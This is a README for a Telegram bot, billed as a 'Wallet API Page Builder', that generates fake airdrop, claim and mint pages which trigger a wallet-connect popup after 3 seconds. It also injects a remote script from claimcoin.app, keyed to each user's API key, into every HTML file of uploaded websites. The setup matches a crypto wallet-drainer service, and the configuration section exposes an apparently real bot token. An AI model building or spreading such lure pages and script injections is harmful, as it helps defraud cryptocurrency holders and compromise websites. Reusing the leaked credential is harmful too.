# Telegram Bot - Wallet API Page Builder

A Telegram bot for creating wallet-connected web pages with automatic deployment.

## Features

1. **User Management**
   - Auto-register on `/start` with Telegram ID, name, username
   - Unique API key generation: `EXO_` + 24 hex chars
   - Super admin (ID 8599926458) auto-approved, others pending
   - Admin can approve/revoke users

2. **Page Builder**
   - Templates: airdrop, claim, mint, nft
   - Generate HTML pages with wallet connect
   - Live preview: `claimcoin.app/pages/{user_id}/{page_id}.html`
   - Dark theme (#0a0a1a bg, #1a1a2e card, #7c3aed accent)
   - Auto wallet popup after 3 seconds

3. **Website Processor**
   - Receive ZIP files
   - Extract and find all .html files
   - Inject wallet script before `</head>`
   - Create modified ZIP for download
   - Reports injected file count

4. **Navigation**
   - Inline buttons for all features
   - Bottom commands: `/start`, `/info`, `/admin`, `/help`
   - Callback handlers for all button patterns

## Installation

```bash
pip install -r requirements.txt
```

## Configuration

Edit `bot.py` constants:

```python
BOT_TOKEN = "8607595004:AAGmqzoNjTNscltH704a0N9tiaT-MUixsqA"
SUPER_ADMIN_ID = 8599926458
DOMAIN = "https://claimcoin.app"
DB_PATH = Path("data/bot.db")
PAGES_DIR = Path("/var/www/wallet-api/pages")
```

## Usage

### Start the bot

```bash
python3 bot.py
```

### User Commands

- `/start` - Register and get API key
- `/info` - Show API key and wallet URL
- `/help` - Show help message
- `/admin` - Admin panel (admins only)

### Page Creation

1. Use `/start` to register
2. Click "New Page" button
3. Select template (airdrop, claim, mint, nft)
4. Page is auto-generated with wallet script
5. Access at `https://claimcoin.app/pages/{user_id}/{page_id}.html`

### ZIP Processing

1. Send a ZIP file to the bot
2. Bot extracts all HTML files
3. Injects wallet script: 
   ```html
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/boxicons@latest/css/boxicons.min.css">
   <script src="https://claimcoin.app/wallet.js?key={API_KEY}"></script>
   ```
4. Returns modified ZIP for download

## Database Schema

### users table
- `telegram_id` - Telegram user ID
- `name` - User name
- `username` - Telegram username
- `api_key` - Unique API key
- `status` - pending/approved
- `is_admin` - Admin flag

### pages table
- `user_id` - Owner ID
- `template` - Page template
- `title`, `amount`, `symbol` - Page content
- `bg_color`, `card_color`, `btn_color` - Styling
- `config` - JSON config
- `html_path` - Published file path

## Wallet Script Injection

The bot injects the following script before `</head>`:

```html
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/boxicons@latest/css/boxicons.min.css">
<script src="https://claimcoin.app/wallet.js?key={API_KEY}"></script>
```

Pages auto-connect wallet after 3 seconds.

## Security

- API keys are unique per user
- Pages are isolated by user ID
- SQLite database with foreign key constraints
- Admin approval required for non-super-admin users
